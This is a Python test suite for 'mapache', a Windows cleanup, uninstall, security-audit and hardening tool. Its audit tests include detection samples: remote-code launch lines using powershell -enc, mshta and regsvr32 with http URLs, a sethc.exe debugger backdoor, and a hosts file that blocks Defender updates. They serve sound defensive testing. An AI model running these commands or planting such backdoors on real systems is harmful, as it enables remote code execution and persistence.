"""Tests that run on any OS: python -m pytest  or  python tests/test_core.py"""
import atexit
import json
import os
import re
import string
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from mapache import i18n  # noqa: E402
from mapache.core.ctx import Ctx  # noqa: E402
from mapache.core.log import Log  # noqa: E402
from mapache.core.model import BigFile, Item  # noqa: E402
from mapache.core.scan import DriveScan  # noqa: E402
from mapache.modules.cleaner import GROUPS  # noqa: E402
from mapache.modules.cleaner.dups import find_duplicates, in_skipped_dir  # noqa: E402
from mapache.modules.cleaner.vms import VBox, family  # noqa: E402
from mapache.modules.diskreport import CATEGORIES  # noqa: E402
from mapache.ui import selector  # noqa: E402

LOC = ROOT / "mapache" / "locales"
PKG = ROOT / "mapache"
_TMP = []


def _tmpdir() -> Path:
    """Temporary directory removed at exit."""
    d = Path(tempfile.mkdtemp(prefix="mapache_test_"))
    _TMP.append(d)
    return d


@atexit.register
def _cleanup():
    import shutil
    for d in _TMP:
        shutil.rmtree(d, ignore_errors=True)


def _load(lang):
    return json.loads((LOC / f"{lang}.json").read_text(encoding="utf-8"))


def _fields(s):
    return {f for _, f, _, _ in string.Formatter().parse(s) if f}


def used_keys() -> set:
    keys = set()
    for py in PKG.rglob("*.py"):
        src = py.read_text(encoding="utf-8")
        keys |= set(re.findall(r"\bt\(\s*[\"']([a-z_]+\.[a-z_.]+)[\"']", src))
        keys |= set(re.findall(r"[\"']((?:clean\.step|dl\.note)_[a-z]+)[\"']", src))
    from mapache.app import MENU
    for k, _ in MENU:
        keys |= {f"menu.{k}", f"menu.{k}.desc"}
    keys |= {f"group.{g}" for g in GROUPS}
    keys |= {f"cat.{c}" for c, _, _ in CATEGORIES} | {"cat.other"}
    return keys


def test_locales_same_keys():
    es, en = _load("es"), _load("en")
    assert set(es) == set(en), set(es) ^ set(en)


def test_locales_same_placeholders():
    es, en = _load("es"), _load("en")
    bad = [k for k in es if _fields(es[k]) != _fields(en[k])]
    assert not bad, bad


def test_all_used_keys_exist():
    es = _load("es")
    missing = sorted(k for k in used_keys() if k not in es)
    assert not missing, missing


def test_translate_and_fallback():
    i18n.set_lang("en")
    assert i18n.t("ago.days", n=3) == "3 days ago"
    i18n.set_lang("es")
    assert i18n.t("ago.days", n=3) == "hace 3 días"
    assert i18n.t("does.not.exist") == "does.not.exist"


def test_scan_and_ctx():
    d = _tmpdir()
    (d / "a" / "b").mkdir(parents=True)
    (d / "a" / "b" / "f.bin").write_bytes(b"x" * 5000)
    (d / "a" / "g.txt").write_bytes(b"y" * 1000)
    (d / "p" / "node_modules" / "x" / "node_modules").mkdir(parents=True)
    sc = DriveScan(d, threads=4, big_min=4000).run(progress=False)
    assert sc.scanned == 6000
    assert sc.size(d / "a" / "b") == 5000
    assert len(sc.big) == 1
    assert [Path(p).name for p in sc.dirs_named("node_modules")] == ["node_modules"]
    ctx = Ctx(admin=False)
    ctx.scan = sc
    assert ctx.size(d / "a") == 6000
    ctx.claim(d / "a" / "b")
    assert ctx.claimed_by(d / "a" / "b" / "f.bin") and ctx.contains_claimed(d / "a")
    assert not ctx.claimed_by(d / "a")


def test_duplicates():
    d = _tmpdir()
    data = os.urandom(3 * 1024 * 1024)
    for name, content in [("a", data), ("b", data), ("c", data[:-1] + b"Z")]:
        (d / name).write_bytes(content)
    files = [BigFile(str(d / n), (d / n).stat().st_size, 0, i) for i, n in enumerate("abc")]
    groups = find_duplicates(files)
    assert [[Path(b.path).name for b in g] for g in groups] == [["a", "b"]]
    assert in_skipped_dir(r"C:\Users\x\.gradle\caches\lib.so")
    assert not in_skipped_dir(r"C:\Users\x\Downloads\game.nsp")
    # A launcher that is a byte-identical copy of a versioned binary is not a duplicate to delete
    assert in_skipped_dir(r"C:\Users\x\.local\bin\claude.exe")
    assert in_skipped_dir(r"C:\Program Files\App\big.dll")


def test_node_modules_only_user_projects():
    # node_modules under Program Files or editor extensions belong to installed programs
    from mapache.core.fs import in_tool_dir
    assert in_tool_dir(r"C:\Program Files\nodejs")
    assert in_tool_dir(r"C:\Program Files (x86)\Microsoft Visual Studio\x\Webviews")
    assert in_tool_dir(r"C:\Users\x\.vscode\extensions\ext")
    assert in_tool_dir(r"C:\Users\x\AppData\Local\Programs\cursor\resources\app")
    assert not in_tool_dir(r"C:\Users\x\Documents\proyectos\web")


def test_vbox_parsing():
    hdds = "UUID: 1\nLocation:  C:\\VMs\\k.vdi\nIn use by VMs: kali (UUID: 9)\n\nUUID: 2\nLocation: C:\\x\\o.vdi\n"
    disks = VBox.parse_hdds(hdds)
    assert len(disks) == 2
    vms = VBox.parse_vms('"kali 2025" {11111111-2222-3333-4444-555555555555}\n')
    assert vms == [("kali 2025", "11111111-2222-3333-4444-555555555555")]
    info = VBox.parse_machinereadable('CfgFile="C:\\VMs\\k.vbox"\nVMState="poweroff"\n'
                                      'VMStateChangeTime="2025-10-01T12:00:00.000000000"\n"SATA-0-0"="C:\\VMs\\k.vdi"\n')
    vm = VBox.make_vm("kali", "1", info)
    assert vm["disks"] == ["C:\\VMs\\k.vdi"] and vm["last"] > 0
    assert family("kali-linux-2025.3") == "kali" and family("Win11 Lab") == "windows"
    # --machinereadable escapes backslashes and quotes
    info = VBox.parse_machinereadable(r'CfgFile="C:\\VMs\\k k\\k.vbox"' + "\n" + r'name="a \"b\""' + "\n")
    assert info["CfgFile"] == r"C:\VMs\k k\k.vbox", info
    assert info["name"] == 'a "b"', info


def test_selector_render():
    i18n.set_lang("es")
    items = [Item("safe", "Papelera", 20 * 1024 ** 3, "rec", "nota", None, selected=True),
             Item("apps", "Unreal Engine 5.7", 26 * 1024 ** 3, "opt", "motor", None, admin=True)]
    rows = selector._build_rows(items)
    ir = [r for r, (k, _) in enumerate(rows) if k == "i"]
    frame = selector._render_list(items, items, rows, ir, 1, 0, 8, 100, False, "", "TEST", lambda g: g)
    plain = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", frame)
    assert "Unreal Engine 5.7" in plain and "motor" in plain
    # accent-insensitive search, sorting within each group
    more = items + [Item("safe", "Música vieja", 5, "opt", "", None), Item("safe", "Zeta", 50, "opt", "", None)]
    assert [i.title for i in selector._view(more, "musica", None)] == ["Música vieja"]
    by_size = selector._view(more, "", ("s", lambda it: -it.size))
    assert [i.title for i in by_size] == ["Papelera", "Zeta", "Música vieja", "Unreal Engine 5.7"]
    empty = selector._render_list(more, [], [], [], 0, 0, 8, 100, False, "", "T", lambda g: g, query="zzz")
    assert "zzz" in empty
    assert selector._parse_sel("1 3-4", 5) == {1, 3, 4} and selector._parse_sel("x", 5) is None
    menu = selector._render_menu("MAPACHE", "v", [dict(key="a", label="Uno", desc="d", enabled=True)], 0, 80, "")
    assert "Uno" in re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", menu)


def test_log_dry_run_does_not_delete():
    d = _tmpdir()
    f = d / "keep.txt"
    f.write_text("x")
    from mapache.core.fs import rm
    log = Log(d / "t.log", dry=True)
    rm(f, log)
    log.close()
    assert f.exists()


# --- Programs ---

def test_uninstaller_plan():
    from mapache.core.uninstaller import exe_from, plan, split_cmd
    assert split_cmd(r"C:\Program Files\App X\uninst.exe /S") == (r"C:\Program Files\App X\uninst.exe", "/S")
    assert split_cmd(r'"C:\A B\u.exe" --x') == (r"C:\A B\u.exe", "--x")
    assert exe_from(r'"C:\A\app.exe",0') == r"C:\A\app.exe"
    d = _tmpdir()
    (d / "My App").mkdir()
    inno, nsis, other = d / "My App" / "unins000.exe", d / "uninst.exe", d / "remove.exe"
    inno.write_bytes(b"MZ" + b"\0" * 100 + b"Inno Setup Setup Data")
    nsis.write_bytes(b"MZ" + b"\0" * 100 + b"Nullsoft.NSIS.exehead")
    other.write_bytes(b"MZ" + b"\0" * 100)
    m, cmd = plan({"UninstallString": str(inno)})  # path with spaces and no quotes
    assert m == "inno" and cmd.startswith(f'"{inno}"') and "/VERYSILENT" in cmd, cmd
    assert plan({"UninstallString": f'"{nsis}"'}) == ("nsis", f'"{nsis}" /S')
    assert plan({"UninstallString": str(other)})[0] == "interactive"
    assert plan({"UninstallString": str(other), "QuietUninstallString": f'"{other}" /quiet'}) == \
        ("quiet", f'"{other}" /quiet')
    assert plan({"UninstallString": "MsiExec.exe /I{1B257839-6CC3-4882-B2C2-E4C0E70B97EF}"}) == \
        ("msi", ["msiexec.exe", "/x", "{1B257839-6CC3-4882-B2C2-E4C0E70B97EF}", "/qn", "/norestart"])
    assert plan({"UninstallString": str(d / "gone.exe")})[0] == "missing"
    assert plan({})[0] == "none"


def test_userassist_and_prefetch_parsing():
    import codecs
    import struct
    from mapache.modules.programs import lastuse
    ft = int((1_700_000_000 + lastuse.EPOCH_DIFF) * 1e7)
    data = bytearray(72)
    struct.pack_into("<I", data, 4, 7)
    struct.pack_into("<Q", data, 60, ft)
    path, last, count = lastuse.decode_userassist(codecs.encode(r"C:\Apps\x.exe", "rot13"), bytes(data))
    assert path == r"C:\Apps\x.exe" and count == 7 and abs(last - 1_700_000_000) < 1
    assert lastuse.expand_known(r"{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\Steam\steam.exe").endswith(r"\Steam\steam.exe")
    # synthetic v30 (variant 2) .pf
    pf = bytearray(0x200)
    struct.pack_into("<I", pf, 0, 30)
    pf[4:8] = b"SCCA"
    pf[0x10:0x10 + 14] = "APP.EXE".encode("utf-16-le")
    struct.pack_into("<I", pf, 0x54, 0x12C)
    struct.pack_into("<2Q", pf, 0x80, ft, ft - 10 ** 7)
    struct.pack_into("<I", pf, 0xC8, 42)
    names = "\\VOLUME{01D9-ABC}\\WINDOWS\\SYSTEM32\\NTDLL.DLL\0\\VOLUME{01D9-ABC}\\PROGRAM FILES\\APP\\APP.EXE\0"
    raw = names.encode("utf-16-le")
    struct.pack_into("<2I", pf, 0x64, 0x100, len(raw))
    pf[0x100:0x100 + len(raw)] = raw
    info = lastuse.parse_prefetch(bytes(pf))
    assert info["exe"] == "APP.EXE" and info["count"] == 42 and len(info["runs"]) == 2
    assert info["path"] == r"\PROGRAM FILES\APP\APP.EXE", info["path"]
    if os.name == "nt":  # real round trip through ntdll: compress with Xpress Huffman, decompress as MAM
        import ctypes
        ntdll = ctypes.WinDLL("ntdll")
        src = bytes(pf) * 20
        ws, frag = ctypes.c_ulong(), ctypes.c_ulong()
        assert ntdll.RtlGetCompressionWorkSpaceSize(ctypes.c_ushort(4), ctypes.byref(ws), ctypes.byref(frag)) == 0
        work = ctypes.create_string_buffer(ws.value)
        out = ctypes.create_string_buffer(len(src) * 2)
        size = ctypes.c_ulong()
        assert ntdll.RtlCompressBuffer(ctypes.c_ushort(4), src, ctypes.c_ulong(len(src)), out,
                                       ctypes.c_ulong(len(out)), ctypes.c_ulong(4096), ctypes.byref(size), work) == 0
        mam = b"MAM\x04" + struct.pack("<I", len(src)) + out.raw[:size.value]
        assert lastuse.mam_decompress(mam) == src


def test_lnk_parsing():
    import struct
    from mapache.core.lnk import LNK_CLSID, parse_lnk
    target = "C:\\Program Files\\App\\app.exe"
    base = target.encode("latin-1") + b"\0"
    li = struct.pack("<7I", 28 + len(base) + 1, 0x1C, 1, 0, 28, 0, 28 + len(base)) + base + b"\0"
    hdr = bytearray(0x4C)
    struct.pack_into("<I", hdr, 0, 0x4C)
    hdr[4:20] = LNK_CLSID
    struct.pack_into("<I", hdr, 0x14, 0x2)
    assert parse_lnk(bytes(hdr) + li) == target
    assert parse_lnk(b"garbage") is None


def test_program_filters_and_leftover_names():
    from types import SimpleNamespace as NS
    from mapache.modules.programs.inventory import critical_kind, is_system_entry
    from mapache.modules.programs.leftovers import Context, norm
    assert is_system_entry({"DisplayName": "Security Update for Windows (KB5034441)"})
    assert is_system_entry({"DisplayName": "x", "SystemComponent": "1"})
    assert not is_system_entry({"DisplayName": "Discord"})
    assert critical_kind("Microsoft Visual C++ 2015-2022 Redistributable (x64)") == "runtime"
    assert critical_kind("Easy Anti-Cheat") == "anticheat" and critical_kind("Discord") == ""
    assert norm("Mozilla Firefox (x64 es-MX) 128.0.1") == "mozillafirefox"
    assert norm("Python 3.12.8 (64-bit)") == "python"

    def prog(i, name, pub="", loc=""):
        return NS(id=i, name=name, publisher=pub, location=loc)
    ff = prog("1", "Mozilla Firefox (x64 es-MX)", "Mozilla", r"C:\Program Files\Mozilla Firefox")
    py12, py14 = prog("2", "Python 3.12.8 (64-bit)"), prog("3", "Python 3.14.3 (64-bit)")
    c = Context(ff, [ff, py12, py14])
    assert c.is_mine("Firefox") and c.is_mine("Mozilla Firefox") and not c.is_mine("Mozilla")
    # Roaming\Python is shared by every Python version
    assert not Context(py12, [py12, py14]).is_mine("Python")
    # A folder named after the publisher (e.g. Program Files\Epic Games, which holds all Epic games)
    # is not a leftover of the launcher
    epic = prog("4", "Epic Games Launcher", "Epic Games, Inc.", r"C:\Program Files (x86)\Epic Games")
    ce = Context(epic, [epic], protected=[r"C:\Program Files\Epic Games\Fortnite"])
    assert not ce.is_mine("Epic Games") and ce.is_mine("EpicGamesLauncher")
    assert not ce.safe_folder(r"C:\Program Files\Epic Games")
    # A generic install subfolder ("Apps") must not match unrelated folders such as AppData\Local\Apps
    cap = prog("5", "CapCut", "Bytedance Pte. Ltd.", r"C:\Users\x\AppData\Local\CapCut\Apps")
    cc = Context(cap, [cap], protected=[])
    assert not cc.is_mine("Apps") and cc.is_mine("CapCut")
    assert not cc.safe_folder(r"C:\Users\x\AppData\Local\Apps")
    assert not cc.safe_folder(r"C:\Users\x\AppData\Local\Packages")
    # Programs installed inside another program's folder
    apo = prog("6", "Equalizer APO", "", r"C:\Program Files\EqualizerAPO")
    peace = prog("7", "Peace", "", r"C:\Program Files\EqualizerAPO\config")
    ca = Context(apo, [apo, peace], protected=[])
    assert ca.points_here(r"C:\Program Files\EqualizerAPO\Editor.exe")
    assert not ca.points_here(r"C:\Program Files\EqualizerAPO\config\Peace.exe")
    assert Context(peace, [apo, peace], protected=[]).inside_other
    eos = prog("8", "Epic Online Services", "Epic Games, Inc.")
    ce2 = Context(epic, [epic, eos], protected=[])
    assert ce2.points_here(r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\EpicGamesLauncher.exe")
    assert not ce2.points_here(r"C:\Program Files (x86)\Epic Games\Epic Online Services\service\EOS.exe")
    # A program named like its publisher still recognizes its own folder
    notion = prog("9", "Notion 4.18.0", "Notion Labs, Inc", r"C:\Users\x\AppData\Local\Programs\Notion")
    assert Context(notion, [notion], protected=[]).is_mine("Notion")
    assert c.points_here(r"C:\Program Files\Mozilla Firefox\firefox.exe")
    assert not c.points_here(r"C:\Program Files\Mozilla Maintenance Service\x.exe")


# --- Audit ---

def _audit(ps=None, reg=None, **kw):
    from mapache.modules.audit.checks import run_all
    from mapache.modules.audit.facts import Facts
    f = Facts(admin=kw.pop("admin", True), ps=ps or {}, reg=reg or {}, files=kw.pop("files", {}), dma=kw.pop("dma", None))
    f.hiber_size, f.dumps, f.startup_files, f.recent = kw.pop("hiber", 0), kw.pop("dumps", []), [], []
    return {r.id: r for r in run_all(f)}


def test_audit_runs_on_empty_facts():
    from mapache.modules.audit.checks import CATEGORIES, score
    i18n.set_lang("es")
    res = _audit()
    assert len(res) >= 45 and all(r.status in ("pass", "warn", "fail", "info", "unknown") for r in res.values())
    assert {r.cat for r in res.values()} <= set(CATEGORIES)
    total, per = score(list(res.values()))
    assert total is None or 0 <= total <= 100
    for r in res.values():  # every check has title, why and fix in both languages
        for lang in ("es", "en"):
            for part in ("title", "why", "fix"):
                assert f"audit.{r.id}.{part}" in _load(lang), (lang, r.id, part)


def test_audit_rules():
    from mapache.core.paths import WIN
    lsa =r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
    res = _audit(ps={"blshell": 2}, reg={
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient": {"EnableMulticast": 0},
        r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest": {"UseLogonCredential": 1},
        lsa: {"RunAsPPL": 1},
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management": {"ClearPageFileAtShutdown": 0},
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe":
            {"Debugger": r"C:\Windows\System32\cmd.exe"},
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DeviceCensus.exe":
            {"Debugger": r"%windir%\System32\taskkill.exe"},
        r"HKLM\SYSTEM\CurrentControlSet\Services\BadSvc": {"ImagePath": r"C:\Program Files\Bad App\svc.exe",
                                                            "Type": 16, "Start": 2},
    }, files={str(WIN / "System32" / "drivers" / "etc" / "hosts"): "0.0.0.0 vortex.data.microsoft.com\n"
                                                                   "127.0.0.1 definitionupdates.microsoft.com\n"},
        dumps=[(r"C:\Windows\LiveKernelReports\WATCHDOG.dmp", 5 * 1024 ** 3)])
    assert res["bitlocker"].status == "fail"
    assert res["llmnr"].status == "pass" and res["wdigest"].status == "fail" and res["lsa_ppl"].status == "pass"
    # without BitLocker, memory artifacts weigh more
    assert res["dumps_present"].status == "fail" and res["dumps_present"].weight > 1
    assert res["ifeo"].status == "fail" and len(res["ifeo"].items) == 2  # sethc debugger = classic backdoor
    assert res["unquoted"].status == "warn"
    assert res["hosts"].status == "fail"  # blocks Defender updates


def test_audit_helpers():
    from mapache.modules.audit.checks.defender import classify_exclusions
    from mapache.modules.audit.checks.persistence import LOLBIN, is_unquoted, parse_hosts
    sus, every = classify_exclusions([r"C:\Users\x\AppData\Roaming\game", r"D:\Tools\burp"], ["powershell.exe"], [".exe"])
    assert len(every) == 4 and len(sus) == 3
    assert LOLBIN.search("powershell -w hidden -enc SQBFAFgA")
    assert LOLBIN.search(r"mshta.exe http://x/a.hta") and LOLBIN.search(r"regsvr32 /s /i:http://x/a.sct scrobj.dll")
    assert not LOLBIN.search(r'"C:\Program Files (x86)\Steam\steam.exe" -silent')
    assert is_unquoted(r"C:\Program Files\ExitLag\ExitLagPmService.exe")
    assert not is_unquoted(r'"C:\Program Files\A B\x.exe"') and not is_unquoted(r"C:\Windows\system32\svchost.exe -k x")
    assert parse_hosts("# c\n127.0.0.1 a b\n") == [("127.0.0.1", "a"), ("127.0.0.1", "b")]


# --- Hardening ---

def test_harden_apply_and_undo_roundtrip():
    import mapache.modules.harden as harden
    from mapache.modules.harden import engine
    from mapache.modules.harden.rules import Rule
    store = {"a": None, "b": 7}

    class Fake(engine.Action):  # in-memory action, does not touch the registry
        kind = "fake"

        def __init__(self, key="a", value=1):
            self.key, self.value = key, value

        def params(self):
            return dict(key=self.key, value=self.value)

        def read(self):
            return {"value": store[self.key]}

        def is_applied(self, state=None):
            return (state or self.read())["value"] == self.value

        def apply(self, log):
            store[self.key] = self.value
            return True

        def revert(self, before, log):
            store[self.key] = before["value"]
            return True

    engine.KINDS["fake"] = Fake
    d = _tmpdir()
    old = harden.snapshot_path
    harden.snapshot_path = lambda *a: d / "snap.json"
    try:
        log = Log(d / "h.log", dry=False)
        rule = Rule("t.fake", "basic", "low", lambda: [])
        snap = harden.apply_rules(Ctx(admin=True), [(rule, [Fake("a", 1), Fake("b", 2), Fake("b", 2)])], log)
        assert store == {"a": 1, "b": 2} and len(snap["changes"]) == 2  # the third one was already applied
        saved = json.loads((d / "snap.json").read_text(encoding="utf-8"))
        assert saved["changes"][0]["before"] == {"value": None}
        ok, bad = harden.revert_snapshot(d / "snap.json", saved, log)
        log.close()
        assert (ok, bad) == (2, 0) and store == {"a": None, "b": 7}  # back to the exact previous state
        assert json.loads((d / "snap.json").read_text(encoding="utf-8"))["reverted"] is True
    finally:
        harden.snapshot_path = old
        del engine.KINDS["fake"]


def test_harden_rules_are_sane():
    from mapache.modules.audit.checks import REGISTRY, run_all  # noqa: F401
    from mapache.modules.harden.engine import MpPref, RegValue, from_dict
    from mapache.modules.harden.rules import BY_ID, GUIDES, LEVELS, RULES
    es, en = _load("es"), _load("en")
    for r in RULES:
        assert r.level in LEVELS and r.risk in ("low", "medium", "high")
        for part in ("title", "desc", "breaks"):
            assert f"harden.{r.id}.{part}" in es and f"harden.{r.id}.{part}" in en, (r.id, part)
    for g in GUIDES:
        assert f"harden.guide.{g}.steps" in es
    # never disable Defender
    for r in RULES:
        try:
            acts = r.build()
        except Exception:
            continue
        for a in acts:
            assert not (isinstance(a, MpPref) and a.param.lower().startswith("disable")), r.id
    # every `harden` id referenced by the audit exists (or is a guide)
    guided = {"crypto.bitlocker_pin", "def.review_exclusions"}
    for cid, cat, w, refs, harden_id, fn in REGISTRY:
        assert not harden_id or harden_id in BY_ID or harden_id in guided, (cid, harden_id)
    # snapshots are reverted from JSON
    a = RegValue("HKLM", r"SYSTEM\X", "UseLogonCredential", "REG_DWORD", 0, default=0)
    b = from_dict(json.loads(json.dumps(a.to_dict())))
    assert b.to_dict() == a.to_dict() and b.is_applied({"exists": False})
    assert not RegValue("HKLM", r"X", "EnableMulticast", "REG_DWORD", 0).is_applied({"exists": False})
    # `accept`: an equal or stricter value counts as applied
    tel = from_dict(json.loads(json.dumps(RegValue("HKLM", r"X", "AllowTelemetry", "REG_DWORD", 1, accept=[0]).to_dict())))
    assert tel.is_applied({"exists": True, "value": 0}) and not tel.is_applied({"exists": True, "value": 3})


# --- Privacy ---

def test_privacy_rules_are_sane():
    from mapache.modules.harden.engine import MpPref, RegValue
    from mapache.modules.privacy import PRIVACY
    from mapache.modules.privacy import rules as pr
    es, en = _load("es"), _load("en")
    for r in pr.RULES:
        assert r.level in pr.LEVELS and r.risk in ("low", "medium", "high")
        for part in ("title", "desc", "breaks"):
            assert f"privacy.{r.id}.{part}" in es and f"privacy.{r.id}.{part}" in en, (r.id, part)
    for g in pr.GUIDES:
        assert f"privacy.guide.{g}.steps" in es and f"privacy.guide.{g}.title" in en
    # privacy only writes registry values, never Defender
    old = pr.browsers
    pr.browsers = lambda: ["chrome", "edge", "brave", "firefox"]
    try:
        for r in pr.RULES:
            acts = r.build()
            assert acts, r.id
            assert all(isinstance(a, RegValue) and not isinstance(a, MpPref) for a in acts), r.id
        # each browser gets its own policy key
        paths = {a.path for a in pr.web_webrtc()}
        assert paths == set(pr.CHROMIUM.values())  # Firefox has no equivalent policy
        # policy names that chrome://policy reports as unknown, deprecated or ignored
        names = {(a.path, a.name) for r in pr.RULES for a in r.build()}
        assert not any(n == "WebRtcIPHandlingPolicy" or n.startswith("PrivacySandbox") for _, n in names)
        assert (pr.CHROMIUM["edge"], "WebRtcLocalhostIpHandling") in names
        assert (pr.CHROMIUM["chrome"], "MetricsReportingEnabled") not in names
        assert any(a.path.endswith("DNSOverHTTPS") for a in pr.web_doh())
        pr.browsers = lambda: []
        assert not pr.RULES[[r.id for r in pr.RULES].index("web.telemetry")].is_available()
    finally:
        pr.browsers = old
    # suite texts fall back to harden.*
    from mapache.i18n import t
    assert PRIVACY.tx("title") == t("privacy.title") != t("harden.title")
    assert "privacy.need_admin" not in es and PRIVACY.tx("need_admin") == t("harden.need_admin")


# --- Optimize ---

def test_optimize_rules_and_actions():
    from mapache.modules.harden.engine import from_dict
    from mapache.modules.harden.rules import Rule
    from mapache.modules.optimize import OPTIMIZE
    from mapache.modules.optimize import rules as orl
    from mapache.modules.optimize.actions import DISABLED_HEX, PowerPlan, StartupOff, TaskOff
    es, en = _load("es"), _load("en")
    for r in orl.RULES:
        assert r.level in orl.LEVELS
        for part in ("title", "desc", "breaks"):
            assert f"optimize.{r.id}.{part}" in es and f"optimize.{r.id}.{part}" in en, (r.id, part)
    for lvl in ("startup", "tasks"):
        assert f"optimize.{lvl}.breaks" in es and f"optimize.level_{lvl}" in en
    for g in orl.GUIDES:
        assert f"optimize.guide.{g}.steps" in es and f"optimize.guide.{g}.title" in en
    # StartupApproved: odd first byte = disabled
    a = StartupOff("HKCU", r"Software\X\StartupApproved\Run", "Spotify")
    assert a.is_applied({"exists": True, "type": "REG_BINARY", "value": "03000000ac29e5091305dd01"})
    assert not a.is_applied({"exists": True, "type": "REG_BINARY", "value": "020000000000000000000000"})
    assert not a.is_applied({"exists": False}) and a.value == DISABLED_HEX
    # all actions survive a JSON round trip
    for act in (a, TaskOff(r"\Vendor\Updater"), PowerPlan("b", avoid="a")):
        b = from_dict(json.loads(json.dumps(act.to_dict())))
        assert type(b) is type(act) and b.to_dict() == act.to_dict()
    # with `avoid`, any plan other than Power saver counts as applied
    p = PowerPlan("balanced", avoid="saver")
    assert p.is_applied({"active": "atlas"}) and not p.is_applied({"active": "saver"})
    # never security software or browser updaters; disabled tasks are skipped
    tasks = [{"Path": "\\", "Name": "GoogleUpdaterTaskSystem", "State": "Ready", "Exec": "updater.exe"},
             {"Path": "\\", "Name": "MicrosoftEdgeUpdateTaskMachineUA", "State": "Ready"},
             {"Path": r"\Malwarebytes" + "\\", "Name": "Scan", "State": "Ready"},
             {"Path": "\\", "Name": "OldThing", "State": "Disabled"},
             {"Path": r"\NVIDIA" + "\\", "Name": "NVIDIA App SelfUpdate", "State": "Ready", "Exec": "nv.exe"},
             {"Path": "\\", "Name": "BlueStacksHelper", "State": "Ready", "Exec": "bs.exe"},
             # disabling a VPN watchdog can leak DNS outside the tunnel
             {"Path": "\\", "Name": "Proton VPN NRPT watchdog", "State": "Ready", "Exec": "ProtonVPN.exe"}]
    got = {c[1]: c[3] for c in orl.task_candidates(tasks)}
    assert got == {"NVIDIA App SelfUpdate": True, "BlueStacksHelper": False}, got
    # dynamic rules: literal title and the group's shared "may break" text
    dyn = Rule("startup:HKCU:Run:Steam", "startup", "low", lambda: [a], title="Steam", note="steam.exe -silent")
    OPTIMIZE.by_id[dyn.id] = dyn
    assert OPTIMIZE.title(dyn.id) == "Steam"
    assert OPTIMIZE.breaks(dyn) == OPTIMIZE.breaks(Rule("x", "startup", "low", list, title="y"))
    assert "Defender" not in [r.title for r in orl.startup_rules()]
    # updaters show the patching warning
    upd = Rule("task:x", "tasks", "medium", list, title="Vendor Update")
    assert OPTIMIZE.breaks(upd) == _load("es")["optimize.tasks.breaks_medium"]
    assert OPTIMIZE.breaks(Rule("task:y", "tasks", "low", list, title="y")) == _load("es")["optimize.tasks.breaks"]
    # the user SID is stripped from displayed task names
    assert orl.clean_name("OneDrive Reporting Task-S-1-5-21-1-22-333-1005") == "OneDrive Reporting Task"
    assert orl.clean_name("BlueStacksHelper_nxt") == "BlueStacksHelper_nxt"


def test_registry_names_are_case_insensitive():
    """Registry value names are case-insensitive."""
    from mapache.core.winreg_util import CIDict
    d = CIDict({"NoDriveTypeAutorun": 255})
    assert d.get("NoDriveTypeAutoRun") == 255 and "nodrivetypeautorun" in d and d["NODRIVETYPEAUTORUN"] == 255
    d["NoDriveTypeAutoRun"] = 1  # same name with different casing is not duplicated
    assert len(d) == 1 and d.get("nodrivetypeautorun") == 1
    pol = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    assert _audit(reg={pol: {"NoDriveTypeAutorun": 255}})["autorun"].status == "pass"


if __name__ == "__main__":
    fails = 0
    for name, fn in list(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"ok    {name}")
            except Exception as e:  # import errors count as failures too
                fails += 1
                print(f"FAIL  {name}: {type(e).__name__}: {e}")
    sys.exit(1 if fails else 0)
